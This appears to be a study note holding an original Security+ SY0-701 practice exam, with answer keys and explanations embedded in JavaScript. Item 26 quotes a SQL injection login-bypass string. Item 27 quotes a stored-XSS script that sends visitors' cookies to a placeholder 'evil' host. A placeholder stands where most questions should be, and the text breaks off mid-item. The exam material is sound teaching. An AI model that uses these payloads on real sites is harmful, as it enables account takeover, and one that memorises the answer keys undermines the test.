---
title: Practice Exam B — Original SY0-701 Drill
category: practice-exam
tags: [practice-exam, exam-b]
status: active
confidence: high
created: 2026-05-22
updated: 2026-05-22
covers: [1.1, 1.2, 1.3, 1.4, 2.1, 2.2, 2.3, 2.4, 2.5, 3.1, 3.2, 3.3, 3.4, 4.1, 4.2, 4.3, 4.4, 4.5, 4.6, 4.7, 4.8, 4.9, 5.1, 5.2, 5.3, 5.4, 5.5, 5.6]
source: Original content, written for SY0-701 objectives
---

# Practice Exam B — Original SY0-701 Drill

**Original** practice exam covering the same SY0-701 objectives and domain distribution as [[quizzes/practice-exam-a|Practice Exam A]]. **85 multiple-choice questions** (B6–B90) plus **5 performance-based questions** (B1–B5) — written from scratch, not drawn from any published exam.

> Use this alongside any published Messer practice exams you take. The point is volume and breadth across the objectives, not duplication.

**How this works:** same harness as Practice Exam A. PBQs first as interactive widgets, then MCQs. **No feedback as you go** — hit **Grade my test** at the bottom and a full report card with per-question feedback drops in at the top.

Pass-line reference: roughly **75–83%** on the MCQs (CompTIA's scaled pass is around 750/900 ≈ 83%).

```dataviewjs
const questions = [
{"n":6,"q":"A facility has a sign at the perimeter reading 'TRESPASSERS WILL BE PROSECUTED.' What type of security control is this sign?","opts":[{"l":"A","t":"Preventive","c":false,"w":"Preventive controls actually block access — a fence or locked gate. A sign by itself doesn't physically stop anyone."},{"l":"B","t":"Deterrent","c":true,"w":"Deterrent controls discourage but don't physically stop. Warning signs are the classic example."},{"l":"C","t":"Compensating","c":false,"w":"Compensating substitutes for a missing control. A sign isn't substituting for anything in this scenario."},{"l":"D","t":"Corrective","c":false,"w":"Corrective controls act after an incident — backups, patches, restorations. A sign predates any incident."}],"topic":"SY0-701, Objective 1.1 - Security Controls","url":"https://professormesser.link/701010101","objective":"1.1","domain":"1"},
{"n":7,"q":"A company's policy requires monthly access-review meetings where managers must re-approve every direct report's permissions. Classify this control along the category axis.","opts":[{"l":"A","t":"Technical","c":false,"w":"Technical controls are enforced by systems (firewalls, ACLs). A monthly meeting isn't system-enforced."},{"l":"B","t":"Managerial","c":true,"w":"Policies and procedures executed by people — including periodic reviews — are managerial controls."},{"l":"C","t":"Operational","c":false,"w":"Operational controls are day-to-day human actions like a guard checking badges. A scheduled review is one step up — it's a policy."},{"l":"D","t":"Physical","c":false,"w":"Physical controls involve tangible barriers (locks, fences). Access reviews are paperwork."}],"topic":"SY0-701, Objective 1.1 - Security Controls","url":"https://professormesser.link/701010101","objective":"1.1","domain":"1"},
{"n":8,"q":"A security team places a deliberately weak file server with realistic-looking documents on a segmented network. The system has no business purpose. Which concept does this BEST illustrate?","opts":[{"l":"A","t":"Honeypot","c":true,"w":"A honeypot is a decoy designed to attract and study attackers. A single fake system on its own network segment fits the definition."},{"l":"B","t":"Honeynet","c":false,"w":"A honeynet is multiple honeypots forming a network of decoys. The scenario describes one system."},{"l":"C","t":"Honeyfile","c":false,"w":"A honeyfile is a single trap document inside a real system — it triggers alerts when accessed."},{"l":"D","t":"Sinkhole","c":false,"w":"A DNS sinkhole redirects malicious domains to a non-routable address. Different mechanism entirely."}],"topic":"SY0-701, Objective 1.2 - Deception and Disruption","url":"https://professormesser.link/701010207","objective":"1.2","domain":"1"},
{"n":9,"q":"Engineering wants to redesign their network so that no device is trusted by default based on its location, and every request must be authenticated and authorized regardless of where it originates. This model is best described as:","opts":[{"l":"A","t":"Defense in depth","c":false,"w":"Defense in depth is layering controls. Zero trust includes layering but is specifically about removing implicit trust."},{"l":"B","t":"Air gap","c":false,"w":"Air gap means physical network isolation. The scenario describes an authentication model, not isolation."},{"l":"C","t":"Zero trust","c":true,"w":"Zero trust removes implicit network trust — every request is verified by identity and posture, not by source network."},{"l":"D","t":"Segmentation","c":false,"w":"Segmentation breaks the network into zones. Zero trust often uses segmentation, but the question describes the trust model, not the network shape."}],"topic":"SY0-701, Objective 1.2 - Zero Trust","url":"https://professormesser.link/701010205","objective":"1.2","domain":"1"},
{"n":10,"q":"Which of the following BEST describes the role of a policy enforcement point (PEP) in a zero-trust architecture?","opts":[{"l":"A","t":"Stores all user identity attributes","c":false,"w":"Identity attributes live in an identity provider / directory, not the PEP."},{"l":"B","t":"Decides whether a given request should be permitted","c":false,"w":"Tempting, but the deciding role is the policy DECISION point (PDP). The PEP is the actuator."},{"l":"C","t":"Enforces the decision by allowing or blocking the request in-line","c":true,"w":"The PEP sits in the data path. It asks the PDP for a decision and then enforces it on the wire."},{"l":"D","t":"Trains users on acceptable-use rules","c":false,"w":"That's awareness training, not a technical zero-trust component."}],"topic":"SY0-701, Objective 1.2 - Zero Trust","url":"https://professormesser.link/701010205","objective":"1.2","domain":"1"},
{"n":11,"q":"An engineering team is about to push a database migration to production. The change-management process requires identifying all systems that depend on the database. Which step does this represent?","opts":[{"l":"A","t":"Backout plan","c":false,"w":"The backout plan covers how to revert if the change fails — not what depends on it."},{"l":"B","t":"Impact analysis","c":true,"w":"Mapping downstream dependencies is the heart of impact analysis. You can't approve a change without knowing what it touches."},{"l":"C","t":"Approval","c":false,"w":"Approval is sign-off, which comes after impact analysis."},{"l":"D","t":"Test plan","c":false,"w":"The test plan covers how the change will be validated, not what depends on it."}],"topic":"SY0-701, Objective 1.3 - Change Management Process","url":"https://professormesser.link/701010301","objective":"1.3","domain":"1"},
{"n":12,"q":"A company's change management process specifies that all firewall rule changes must happen during a 2-hour window between 02:00 and 04:00 every Sunday. This window is BEST described as:","opts":[{"l":"A","t":"Service-level agreement","c":false,"w":"An SLA describes uptime/performance commitments, not change timing."},{"l":"B","t":"Maintenance window","c":true,"w":"Pre-scheduled time slots reserved for changes are maintenance windows. They contain disruption risk to a known period."},{"l":"C","t":"Standard operating procedure","c":false,"w":"An SOP is a step-by-step procedure — the window is when those procedures run, not the procedures themselves."},{"l":"D","t":"Risk register entry","c":false,"w":"A risk register entry catalogues a specific risk. A recurring maintenance schedule isn't a risk entry."}],"topic":"SY0-701, Objective 1.3 - Change Management Process","url":"https://professormesser.link/701010301","objective":"1.3","domain":"1"},
{"n":13,"q":"A messaging app advertises 'end-to-end encryption.' What property does this provide that transport encryption alone does not?","opts":[{"l":"A","t":"Faster message delivery","c":false,"w":"E2EE often adds slight overhead; speed isn't the benefit."},{"l":"B","t":"The server operator cannot read message contents","c":true,"w":"E2EE means only sender and recipient hold keys. Transport encryption (TLS) only protects the message in flight — the server can still see it."},{"l":"C","t":"Messages are stored permanently","c":false,"w":"Retention is a separate policy. E2EE doesn't dictate retention."},{"l":"D","t":"Authentication of the sender's identity","c":false,"w":"E2EE can be paired with sender authentication, but the protection it provides is content confidentiality from intermediaries."}],"topic":"SY0-701, Objective 1.4 - Encrypting Data","url":"https://professormesser.link/701010402","objective":"1.4","domain":"1"},
{"n":14,"q":"Two parties want to establish a shared symmetric key over an untrusted network without ever transmitting the key itself. Which technique BEST fits?","opts":[{"l":"A","t":"Diffie-Hellman key exchange","c":true,"w":"DH lets two parties derive a shared secret from public-key math; the secret itself never crosses the wire."},{"l":"B","t":"AES-256","c":false,"w":"AES is a symmetric cipher used AFTER a key is established — it doesn't establish the key."},{"l":"C","t":"SHA-256","c":false,"w":"SHA is a hashing function. Not used for key establishment."},{"l":"D","t":"HMAC","c":false,"w":"HMAC requires a shared key — it doesn't establish one."}],"topic":"SY0-701, Objective 1.4 - Public Key Infrastructure","url":"https://professormesser.link/701010401","objective":"1.4","domain":"1"},
{"n":15,"q":"A developer is choosing between RSA and ECC for signing artifacts. The system runs on resource-constrained IoT devices. Which factor MOST favors ECC?","opts":[{"l":"A","t":"Wider library support across legacy systems","c":false,"w":"RSA actually has wider legacy support — that's an argument for RSA, not ECC."},{"l":"B","t":"Stronger security per bit, allowing smaller keys for equivalent strength","c":true,"w":"A 256-bit ECC key offers comparable security to a 3072-bit RSA key. Less CPU and less memory — ideal for IoT."},{"l":"C","t":"Simpler mathematics for hand-verification","c":false,"w":"Both are non-trivial to verify by hand; not a real factor."},{"l":"D","t":"Faster on legacy 32-bit hardware than RSA","c":false,"w":"Performance depends on implementation. The dominant ECC advantage is key size, not raw speed on legacy hardware."}],"topic":"SY0-701, Objective 1.4 - Encrypting Data","url":"https://professormesser.link/701010402","objective":"1.4","domain":"1"},
{"n":16,"q":"A team is implementing storage encryption. Which level encrypts every block written to disk transparently, including the operating system itself?","opts":[{"l":"A","t":"File-level encryption","c":false,"w":"File-level encrypts individual files. The OS partition would not normally be one of them."},{"l":"B","t":"Database encryption (column-level)","c":false,"w":"Column-level encrypts specific database columns. Disk-wide it is not."},{"l":"C","t":"Full-disk encryption","c":true,"w":"FDE (e.g., BitLocker, LUKS) encrypts the entire disk including the OS volume. Decryption happens at boot via the trusted boot chain."},{"l":"D","t":"Transport encryption","c":false,"w":"Transport encryption protects data in motion, not at rest."}],"topic":"SY0-701, Objective 1.4 - Encrypting Data","url":"https://professormesser.link/701010402","objective":"1.4","domain":"1"},
{"n":17,"q":"A company uses a hardware-rooted device that securely stores and manages cryptographic keys for high-volume server-side TLS termination. Which device matches this description?","opts":[{"l":"A","t":"TPM","c":false,"w":"TPMs are per-device chips, generally not designed for high-volume key operations across a fleet."},{"l":"B","t":"HSM","c":true,"w":"An HSM is a hardened, often networked appliance built for high-volume key operations and tamper-resistant key storage. Common at TLS termination points."},{"l":"C","t":"Secure enclave","c":false,"w":"Secure enclaves are CPU features (e.g., Apple's, Intel SGX) — per-device, not server-side appliances."},{"l":"D","t":"Key escrow","c":false,"w":"Key escrow is the practice of depositing keys with a third party — not a hardware device."}],"topic":"SY0-701, Objective 1.4 - Encryption Technologies","url":"https://professormesser.link/701010404","objective":"1.4","domain":"1"},
{"n":18,"q":"A compensating control is BEST described as:","opts":[{"l":"A","t":"A control that prevents an action before it happens","c":false,"w":"That's a preventive control."},{"l":"B","t":"A control that detects and alerts on an action that has occurred","c":false,"w":"That's a detective control."},{"l":"C","t":"An alternative control that addresses a risk when the primary control isn't feasible","c":true,"w":"Compensating controls substitute for the ideal control. Example: extra logging when you can't deploy the proper patch yet."},{"l":"D","t":"A control that defines required behavior via written policy","c":false,"w":"That's a directive control."}],"topic":"SY0-701, Objective 1.1 - Security Controls","url":"https://professormesser.link/701010101","objective":"1.1","domain":"1"},
{"n":19,"q":"What is the primary purpose of a salt in password hashing?","opts":[{"l":"A","t":"Make the hash easier to verify","c":false,"w":"Salts don't make verification easier; they just add a known random value to the input."},{"l":"B","t":"Encrypt the password instead of hashing it","c":false,"w":"Salts don't encrypt — they're added to the input before hashing."},{"l":"C","t":"Ensure that two users with the same password produce different hashes","c":true,"w":"Per-user salts make precomputed rainbow tables useless and prevent attackers from spotting shared passwords across users."},{"l":"D","t":"Replace the need for a strong password policy","c":false,"w":"Salting doesn't help against guessing a weak password individually; it just stops cross-user inference."}],"topic":"SY0-701, Objective 1.4 - Hashing and Digital Signatures","url":"https://professormesser.link/701010406","objective":"1.4","domain":"1"},
{"n":20,"q":"A small company implements a 'least privilege' model on its file server. Which behavior BEST demonstrates this principle in practice?","opts":[{"l":"A","t":"All employees can read every shared file by default","c":false,"w":"That's the opposite — most-privilege defaults."},{"l":"B","t":"Each employee's account has only the file-share access required for their job duties","c":true,"w":"Least privilege grants exactly what's needed for the role — no more, no less."},{"l":"C","t":"Administrators use their privileged accounts for daily email and browsing","c":false,"w":"That violates least privilege at the admin level. Admins should use standard accounts for routine work and elevate only when needed."},{"l":"D","t":"Every user gets local admin to reduce help-desk tickets","c":false,"w":"Convenient, but expensive in compromise blast radius — direct contradiction of least privilege."}],"topic":"SY0-701, Objective 1.2 - Fundamental Security Concepts","url":"https://professormesser.link/701010202","objective":"1.2","domain":"1"},
{"n":21,"q":"A breach is traced to an employee who knowingly shared confidential documents with a competitor in exchange for payment. Which threat actor classification fits BEST?","opts":[{"l":"A","t":"Hacktivist","c":false,"w":"Hacktivists are motivated by ideology, not money."},{"l":"B","t":"Malicious insider","c":true,"w":"An employee with authorized access who deliberately abuses it for personal gain is the textbook malicious insider."},{"l":"C","t":"Script kiddie","c":false,"w":"Script kiddies typically lack the access this scenario describes."},{"l":"D","t":"Nation-state","c":false,"w":"Nation-state actors target strategic objectives, often without payment to individual employees — and the actor here is the employee, not a sponsor."}],"topic":"SY0-701, Objective 2.1 - Threat Actors","url":"https://professormesser.link/701020101","objective":"2.1","domain":"2"},
{"n":22,"q":"Which of the following BEST distinguishes a nation-state actor from organized crime?","opts":[{"l":"A","t":"Nation-state actors are louder; they want to be noticed","c":false,"w":"Generally the opposite — nation-states often prize stealth and persistence."},{"l":"B","t":"Organized crime is funded by foreign governments","c":false,"w":"Organized crime is generally self-funded through criminal proceeds."},{"l":"C","t":"Nation-state actors are typically well-resourced, patient, and pursue strategic rather than financial goals","c":true,"w":"Nation-states have time, money, and people. Their goals are intelligence, disruption, or strategic advantage — not immediate revenue."},{"l":"D","t":"Organized crime targets only individuals, never companies","c":false,"w":"Organized crime targets whatever's profitable, including companies and infrastructure."}],"topic":"SY0-701, Objective 2.1 - Threat Actors","url":"https://professormesser.link/701020101","objective":"2.1","domain":"2"},
{"n":23,"q":"An attacker calls the help desk pretending to be a senior executive and pressures the technician to reset a password 'immediately for an urgent board meeting.' Which social engineering principle is the attacker exploiting MOST?","opts":[{"l":"A","t":"Scarcity","c":false,"w":"Scarcity is about limited supply/time. Authority pressure is the dominant lever here."},{"l":"B","t":"Authority and urgency","c":true,"w":"Impersonating a high-status person AND creating time pressure are two of the most effective social engineering levers, combined here."},{"l":"C","t":"Familiarity","c":false,"w":"Familiarity is about prior relationships. The attacker is impersonating someone the technician likely doesn't know personally."},{"l":"D","t":"Consensus","c":false,"w":"Consensus is 'everyone else is doing it.' Not the lever in this scenario."}],"topic":"SY0-701, Objective 2.2 - Social Engineering","url":"https://professormesser.link/701020204","objective":"2.2","domain":"2"},
{"n":24,"q":"A user receives a text message claiming to be from their bank, asking them to click a link and 'confirm a suspicious transaction.' What is this attack called?","opts":[{"l":"A","t":"Vishing","c":false,"w":"Vishing is phishing over voice/phone."},{"l":"B","t":"Smishing","c":true,"w":"Smishing is phishing over SMS (text messages). Same playbook as email phishing, different channel."},{"l":"C","t":"Pharming","c":false,"w":"Pharming redirects users to fake sites via DNS or hosts-file manipulation — no inbound message required."},{"l":"D","t":"Whaling","c":false,"w":"Whaling targets senior executives specifically. The channel and target population don't fit."}],"topic":"SY0-701, Objective 2.2 - Phishing","url":"https://professormesser.link/701020202","objective":"2.2","domain":"2"},
{"n":25,"q":"Which of the following is the BEST example of a watering-hole attack?","opts":[{"l":"A","t":"An attacker sends millions of generic phishing emails hoping for clicks","c":false,"w":"That's mass phishing. No targeting."},{"l":"B","t":"An attacker compromises an industry forum frequented by the target's employees, planting malware to infect visitors","c":true,"w":"Watering hole = compromise a site the target audience already trusts and visits. Pre-position malware and wait."},{"l":"C","t":"An attacker physically tailgates an employee through a secured door","c":false,"w":"That's tailgating / piggybacking — a physical attack."},{"l":"D","t":"An attacker tries the same password across many user accounts","c":false,"w":"That's password spraying — a credential attack."}],"topic":"SY0-701, Objective 2.2 - Phishing","url":"https://professormesser.link/701020202","objective":"2.2","domain":"2"},
{"n":26,"q":"A web application accepts user input and inserts it directly into a SQL query string without parameterization. An attacker submits `' OR 1=1 --` in a login form and gains entry. This vulnerability is BEST described as:","opts":[{"l":"A","t":"Cross-site scripting","c":false,"w":"XSS injects script into web pages viewed by other users. This attack injects into a database query."},{"l":"B","t":"Buffer overflow","c":false,"w":"Buffer overflows manipulate memory bounds. This is a logic-layer string injection."},{"l":"C","t":"SQL injection","c":true,"w":"User input flowing unsanitized into a SQL query is the textbook SQL injection vulnerability. Parameterized queries fix it."},{"l":"D","t":"Race condition","c":false,"w":"Race conditions exploit timing between operations — unrelated to this attack pattern."}],"topic":"SY0-701, Objective 2.3 - SQL Injection","url":"https://professormesser.link/701020306","objective":"2.3","domain":"2"},
{"n":27,"q":"A web app's profile page renders the user's display name without HTML-escaping. An attacker sets their display name to `<script>document.location='https://evil/?c='+document.cookie</script>`. When other users view that profile, their browsers execute the script. Which vulnerability category is this?","opts":[{"l":"A","t":"Stored XSS","c":true,"w":"The script is stored server-side (in the display name) and then served to other users — classic stored cross-site scripting."},{"l":"B","t":"Reflected XSS","c":false,"w":"Reflected XSS bounces input back from a single request — typically via URL parameters. Here it's persistently stored."},{"l":"C","t":"CSRF","c":false,"w":"CSRF tricks a user's browser into making authenticated requests. This attack runs code in the victim's browser, not actions on their behalf."},{"l":"D","t":"SQL injection","c":false,"w":"No SQL is being injected — this is HTML/JS rendering in the browser."}],"topic":"SY0-701, Objective 2.3 - Cross-Site Scripting","url":"https://professormesser.link/701020307","objective":"2.3","domain":"2"},
{"n":28,"q":"A vendor announces that a vulnerability in their proprietary appliance has no available patch and won't have one — the product line is end-of-life. Which mitigation is MOST appropriate?","opts":[{"l":"A","t":"Wait for the next quarterly patch cycle","c":false,"w":"There won't be one. EOL means support is over."},{"l":"B","t":"Add compensating controls (segmentation, monitoring, traffic filters) until the device can be replaced","c":true,"w":"When you can't fix the asset, wrap it. Compensating controls reduce risk while you plan replacement."},{"l":"C","t":"Increase the device's network exposure to test it more thoroughly","c":false,"w":"That increases risk; the opposite of mitigation."},{"l":"D","t":"Document acceptance of the risk and continue using the device unchanged","c":false,"w":"Pure risk acceptance for a known unpatched vulnerability on a network-connected device is rarely acceptable. Add compensating controls first."}],"topic":"SY0-701, Objective 2.3 - Hardware vulnerabilities","url":"https://professormesser.link/701020308","objective":"2.3","domain":"2"},
{"n":29,"q":"A specific vulnerability has been publicly disclosed but no patch is yet available, and active exploits are circulating. Which term describes this window?","opts":[{"l":"A","t":"Zero-day","c":true,"w":"A zero-day is a vulnerability being exploited (or publicly known) before the vendor has had time to patch it — 'day zero' of patch availability."},{"l":"B","t":"CVE","c":false,"w":"CVE is the catalog identifier — a vuln has a CVE whether it's zero-day or 10 years old."},{"l":"C","t":"End-of-life","c":false,"w":"EOL means the product is no longer supported. Distinct from patch timing for in-support products."},{"l":"D","t":"Misconfiguration","c":false,"w":"Misconfiguration is a different vulnerability class — operator error rather than a software defect."}],"topic":"SY0-701, Objective 2.3 - Vulnerabilities","url":"https://professormesser.link/701020310","objective":"2.3","domain":"2"},
{"n":30,"q":"An attacker captures encrypted Kerberos authentication packets from a network tap and later replays them to gain access. What category of attack is this?","opts":[{"l":"A","t":"Brute-force attack","c":false,"w":"Brute force tries credentials directly. Replay sends recorded authentic-looking traffic."},{"l":"B","t":"Replay attack","c":true,"w":"Capturing real authentication traffic and re-transmitting it is the definition of a replay attack. Mitigated with nonces/timestamps."},{"l":"C","t":"DNS poisoning","c":false,"w":"DNS poisoning manipulates name resolution. Different attack class."},{"l":"D","t":"Privilege escalation","c":false,"w":"Privilege escalation elevates an existing foothold. Replay establishes (or re-establishes) access."}],"topic":"SY0-701, Objective 2.4 - Network Attacks","url":"https://professormesser.link/701020405","objective":"2.4","domain":"2"},
{"n":31,"q":"Botnets are MOST commonly used for which type of attack?","opts":[{"l":"A","t":"DDoS amplification","c":true,"w":"Distributed denial-of-service is the canonical botnet use case — many compromised hosts firing traffic at one target."},{"l":"B","t":"Single-source phishing","c":false,"w":"Phishing doesn't typically require a botnet."},{"l":"C","t":"Local privilege escalation","c":false,"w":"Local privesc happens on one host. Botnets are about coordinating many."},{"l":"D","t":"Side-channel cache attacks","c":false,"w":"Side-channel attacks are surgical and local — not what botnets do."}],"topic":"SY0-701, Objective 2.4 - Denial of Service","url":"https://professormesser.link/701020406","objective":"2.4","domain":"2"},
{"n":32,"q":"Malware that demands payment in cryptocurrency in exchange for decrypting a victim's files is called:","opts":[{"l":"A","t":"Spyware","c":false,"w":"Spyware covertly collects information. It doesn't typically encrypt and ransom."},{"l":"B","t":"Rootkit","c":false,"w":"Rootkits hide attacker presence at low levels of the OS. They don't demand payment."},{"l":"C","t":"Ransomware","c":true,"w":"Encrypt-and-extort is the defining behavior of ransomware. Crypto payment makes attribution harder."},{"l":"D","t":"Worm","c":false,"w":"Worms self-propagate. Ransomware may use worm-like propagation but the ransom is the distinguishing trait."}],"topic":"SY0-701, Objective 2.4 - Malware","url":"https://professormesser.link/701020401","objective":"2.4","domain":"2"},
{"n":33,"q":"A user reports that their computer began running slowly and showing pop-ups after they installed a free 'system optimizer.' Closer inspection finds the tool legitimately defragments their disk but also logs keystrokes in the background. This malware is BEST classified as:","opts":[{"l":"A","t":"Worm","c":false,"w":"Worms propagate themselves over networks. No propagation is described."},{"l":"B","t":"Trojan","c":true,"w":"A Trojan disguises itself as something the user wants (a system optimizer) and ships something they don't (a keylogger). Concealment is the hallmark."},{"l":"C","t":"Ransomware","c":false,"w":"No encryption or ransom demand."},{"l":"D","t":"Rootkit","c":false,"w":"Rootkits operate at kernel/firmware level for stealth. The scenario doesn't describe that depth."}],"topic":"SY0-701, Objective 2.4 - Malware","url":"https://professormesser.link/701020401","objective":"2.4","domain":"2"},
{"n":34,"q":"An adversary spends six months quietly establishing footholds in a defense contractor's network, exfiltrating documents weekly, and rotating C2 infrastructure to avoid detection. Which threat profile fits BEST?","opts":[{"l":"A","t":"Script kiddie","c":false,"w":"Script kiddies use off-the-shelf tools and rarely sustain long-term presence."},{"l":"B","t":"Advanced persistent threat (APT)","c":true,"w":"Long-dwell, well-resourced, stealthy, strategic-target attackers are the textbook APT profile."},{"l":"C","t":"Insider threat","c":false,"w":"No insider involvement is described."},{"l":"D","t":"Hacktivist","c":false,"w":"Hacktivists generally favor public disruption, not silent multi-month exfiltration."}],"topic":"SY0-701, Objective 2.4 - Threat Actors","url":"https://professormesser.link/701020101","objective":"2.4","domain":"2"},
{"n":35,"q":"A security team discovers that domain-joined laptops have inconsistent local firewall settings. Which Windows-environment tool is the MOST appropriate to enforce a consistent baseline?","opts":[{"l":"A","t":"Group Policy","c":true,"w":"Group Policy is the centralized configuration mechanism for domain-joined Windows endpoints. Firewall settings are a standard GPO target."},{"l":"B","t":"DNS filtering","c":false,"w":"DNS filtering blocks domain resolution. It doesn't manage host firewall configuration."},{"l":"C","t":"DLP","c":false,"w":"DLP focuses on data movement, not firewall settings."},{"l":"D","t":"SIEM","c":false,"w":"SIEMs collect and correlate logs; they don't push configuration."}],"topic":"SY0-701, Objective 2.5 - Mitigation Techniques","url":"https://professormesser.link/701020502","objective":"2.5","domain":"2"},
{"n":36,"q":"A security team is hardening a Linux server. Which of the following BEST describes 'reducing the attack surface' on this host?","opts":[{"l":"A","t":"Adding more user accounts so individual blast radius is smaller","c":false,"w":"More accounts is more surface, not less."},{"l":"B","t":"Disabling and removing services and ports not required by the host's role","c":true,"w":"Removing unneeded services, packages, listening ports, and accounts is the textbook surface-reduction action."},{"l":"C","t":"Enabling all available logging sources","c":false,"w":"More logging is good for detection but doesn't shrink the attack surface."},{"l":"D","t":"Increasing CPU and RAM allocation","c":false,"w":"Resources have nothing to do with attack surface."}],"topic":"SY0-701, Objective 2.5 - Hardening","url":"https://professormesser.link/701020503","objective":"2.5","domain":"2"},
{"n":37,"q":"Network segmentation reduces the impact of a single host compromise by:","opts":[{"l":"A","t":"Preventing all malware infections by default","c":false,"w":"Segmentation doesn't prevent infection. It limits its spread."},{"l":"B","t":"Limiting which other hosts the compromised system can reach","c":true,"w":"Segments restrict east-west traffic. A compromised host in a tight segment has nowhere to go."},{"l":"C","t":"Increasing the speed of patches across the fleet","c":false,"w":"Patching speed is unrelated to segmentation."},{"l":"D","t":"Eliminating the need for endpoint security on segmented hosts","c":false,"w":"Defense in depth still applies inside segments."}],"topic":"SY0-701, Objective 2.5 - Segmentation and Access Control","url":"https://professormesser.link/701020501","objective":"2.5","domain":"2"},
__INSERT_QUESTIONS_HERE_DO_NOT_EDIT__
];

const pbqs = [
  {"n":1,"title":"PKI certificate components","type":"match","prompt":"A new web team is learning the moving parts of public-key infrastructure. Match each PKI element to the function it performs. Each element is used exactly once.","options":["CRL","OCSP","CA","CSR","OCSP stapling"],"items":[{"id":"1a","desc":"Browser asks 'is this cert still valid?' over a real-time request","answer":"OCSP","w":"OCSP is the per-cert real-time revocation check protocol; CRL is the bulk download alternative."},{"id":"1b","desc":"Bundle of revoked-certificate serial numbers, published by the issuer","answer":"CRL","w":"CRL = Certificate Revocation List. Downloaded periodically by clients; can grow large."},{"id":"1c","desc":"Issues and signs end-entity certificates inside a PKI","answer":"CA","w":"The Certificate Authority is the root of trust. Browsers trust certs because they chain to a trusted CA."},{"id":"1d","desc":"What the server sends to the CA to request a new certificate, containing the public key and identity info","answer":"CSR","w":"CSR = Certificate Signing Request. Server-generated, sent to CA, which returns a signed certificate."},{"id":"1e","desc":"Server attaches its own freshly-signed OCSP response inside the TLS handshake so the client doesn't have to ask the CA","answer":"OCSP stapling","w":"Stapling moves the OCSP-check work to the server, reducing client latency and CA load."}],"objective":"1.4","url":"https://professormesser.link/701010408"},
  {"n":2,"title":"Endpoint hardening by device type","type":"match","prompt":"A regional retailer is hardening two device classes: field-staff tablets and corporate workstations. For each control below, pick the device class it most naturally belongs to (or 'Not applicable' if it isn't a useful fit for either).","options":["Field tablet","Corporate workstation","Not applicable"],"items":[{"id":"2a","desc":"MDM enrollment with remote wipe","answer":"Field tablet","w":"MDM is the mobile-device management plane — designed for tablets and phones, not desktops."},{"id":"2b","desc":"Full-disk encryption","answer":"Field tablet","w":"Both could use FDE, but it's mandatory on the device most likely to leave the office. Tablets get lost or stolen — workstation FDE is good practice but a smaller risk delta."},{"id":"2c","desc":"Host-based firewall managed via Group Policy","answer":"Corporate workstation","w":"Group Policy is a Windows AD construct — applies to domain-joined workstations, not BYOD-style tablets."},{"id":"2d","desc":"Biometric unlock (face or fingerprint)","answer":"Field tablet","w":"Tablets have built-in cameras and fingerprint sensors; most workstations don't."},{"id":"2e","desc":"EDR agent with kernel-level telemetry","answer":"Corporate workstation","w":"EDR has rich support on full desktop OSes; mobile EDR exists but is much more limited."},{"id":"2f","desc":"Air-gapped network isolation","answer":"Not applicable","w":"Field tablets are by definition connected; workstations aren't air-gapped either. Air-gapping is for isolated industrial systems."},{"id":"2g","desc":"Open-source intelligence scanning","answer":"Not applicable","w":"OSINT is a reconnaissance technique, not an endpoint hardening control."}],"objective":"4.1","url":"https://professormesser.link/701040102"},
  {"n":3,"title":"Incident response sequence","type":"match","prompt":"Place each NIST incident response phase in the correct position. Each position number is used exactly once.","options":["1","2","3","4","5","6","7"],"items":[{"id":"3a","desc":"Preparation","answer":"1","w":"Comes first — done before anything happens. Tools, runbooks, contact lists, training."},{"id":"3b","desc":"Detection","answer":"2","w":"Identifying that something is happening — alerts, anomalies, user reports."},{"id":"3c","desc":"Analysis","answer":"3","w":"Confirming it's real, scoping it, classifying severity. Often paired with detection but distinct."},{"id":"3d","desc":"Containment","answer":"4","w":"Stop the spread before cleaning up. Isolate hosts, kill sessions, block traffic."},{"id":"3e","desc":"Eradication","answer":"5","w":"Remove the cause — kill the malware, close the vulnerability, revoke the credentials."},{"id":"3f","desc":"Recovery","answer":"6","w":"Restore service. Bring systems back online, validate they're clean, monitor closely."},{"id":"3g","desc":"Lessons learned","answer":"7","w":"Postmortem — what worked, what didn't, what to change in Preparation next time. Closes the loop."}],"objective":"4.8","url":"https://professormesser.link/701040801"},
  {"n":4,"title":"Cryptographic technique by purpose","type":"match","prompt":"Match each cryptographic technique to the security goal it primarily addresses. Each technique is used exactly once.","options":["Hashing","Digital signature","Symmetric encryption","Salting","Key stretching","HMAC"],"items":[{"id":"4a","desc":"Storing passwords so the original can't be recovered, even by the database administrator","answer":"Hashing","w":"One-way function. Verify by hashing the supplied password and comparing — never store the plaintext."},{"id":"4b","desc":"Adding unique per-user randomness so two users with the same password get different hashes","answer":"Salting","w":"Defeats precomputed rainbow tables and stops attackers from spotting users with matching passwords."},{"id":"4c","desc":"Bulk-encrypting a large file with a single shared key, fast","answer":"Symmetric encryption","w":"AES and friends. Single key for both encrypt and decrypt — fast, but the key has to be distributed securely."},{"id":"4d","desc":"Proving a message came from a specific sender and wasn't altered in transit","answer":"Digital signature","w":"Sender hashes the message, encrypts the hash with their private key. Anyone with the public key can verify."},{"id":"4e","desc":"Verifying message integrity AND authenticity using a shared secret, without asymmetric crypto","answer":"HMAC","w":"Keyed hash — output depends on both message and shared key. Cheaper than digital signatures, but no non-repudiation."},{"id":"4f","desc":"Making password-hash brute-forcing computationally painful by running the hash function thousands of times","answer":"Key stretching","w":"bcrypt, PBKDF2, scrypt, Argon2. Slows down each guess from microseconds to milliseconds — devastating to attackers."}],"objective":"1.4","url":"https://professormesser.link/701010406"},
  {"n":5,"title":"Stateful firewall rules — segmented architecture","type":"firewall","prompt":"A mid-size company has a DMZ and an internal network separated by a stateful firewall. Complete the rules below to meet each policy goal. Because the firewall is stateful, only the initiating direction needs a rule.","servers":[{"name":"Reverse Proxy (DMZ)","ip":"10.20.30.5"},{"name":"Public DNS (DMZ)","ip":"10.20.30.10"},{"name":"SMTP Relay (DMZ)","ip":"10.20.30.25"},{"name":"App Server (Internal)","ip":"172.16.50.8"},{"name":"Internal DNS (Internal)","ip":"172.16.50.53"},{"name":"Backup Server (Internal)","ip":"172.16.50.99"}],"ports":["20","21","22","23","25","53","80","110","143","389","443","445","636","3389"],"rules":[{"id":"5a","goal":"Allow the Reverse Proxy to reach the App Server over HTTPS so the proxy can forward incoming web traffic.","answer":{"srcIP":"10.20.30.5","dstIP":"172.16.50.8","proto":"TCP","port":"443","action":"Allow"},"w":"Reverse proxy initiates the back-end connection. HTTPS = TCP/443. DMZ-to-internal flow needs explicit allow."},{"id":"5b","goal":"Block any direct SSH from the Public DNS server to the Backup Server — backups are managed only from the admin jump host (not shown).","answer":{"srcIP":"10.20.30.10","dstIP":"172.16.50.99","proto":"TCP","port":"22","action":"Block"},"w":"SSH = TCP/22. The Public DNS box has no business touching internal backups; this is an explicit 